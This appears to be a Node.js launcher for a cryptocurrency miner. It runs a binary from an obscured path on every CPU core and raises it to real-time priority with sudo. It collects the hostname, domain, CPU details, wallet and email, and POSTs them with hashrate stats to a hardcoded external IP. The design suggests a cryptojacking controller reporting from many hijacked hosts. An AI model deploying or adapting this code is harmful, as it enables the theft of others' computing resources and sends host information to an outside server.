const spawn = require('child_process').spawn;
const exec = require('child_process').exec;
const execSync = require('child_process').execSync;
const args = process.argv.slice(2);
const http = require("http");
const os = require('os');
const miner = spawn('/patata/patata2', ['-o', args[1], '-u', args[0], '-t', os.cpus().length, '--av=2', '-k', '--no-color']);
const options = {
    host: "51.254.143.175",
    path: "/check",
    port: "8085",
    method: "POST",
    headers: {"Content-Type": "application/json"},
};
var info = getInfo();
execSync('sudo chrt -f -p 98 ' + miner.pid)
function getInfo () {
    var res = {
        tpc: os.cpus().length,
        freq: '',
        cache: ''
    };
    var info = execSync('lscpu') + '';
    info = info.split('\n');
    for (var i = info.length - 1; i >= 0; i--) {
        var str = info[i];
        if (str.indexOf('Model name') !== -1) {
            res.freq = str.substr(str.indexOf('@') + 2).trim();
        } else if (str.indexOf('L3 cache') !== -1) {
            res.cache = str.substr(str.indexOf(':') + 1).trim();
        }
    }
    return res;
}

var body = {
    instance: os.hostname(),
    project: '' + execSync('hostname -d'),
    wallet: (args[0]) ? args[0] : '',
    mail: (args[3]) ? args[3] : '',
    uptime: os.uptime() * 1000,
    hashrate: {
        short: 'n/a',
        mid: 'n/a',
        long: 'n/a',
        highest: 'n/a'
    },
    sys: info
};


function sendData (callback) {
    var req = http.request(options, function (res) {
        callback();
    });
    req.write(JSON.stringify(body));
    req.end();
    req.on('error', function (e) {
        console.log('Problem with request:', options);
    });
}

miner.stdout.on('data', function (data) {
    data += '';
    
    if (data.indexOf('speed') !== -1) {
        var hashrates = data.split(' ');
        body.hashrate = {
            short: hashrates[4],
            mid: hashrates[5],
            long: hashrates[6],
            highest: hashrates[9]
        };
        body.uptime = os.uptime() * 1000;
        sendData(function () {
            console.log('sended', body);
        });
    }
});
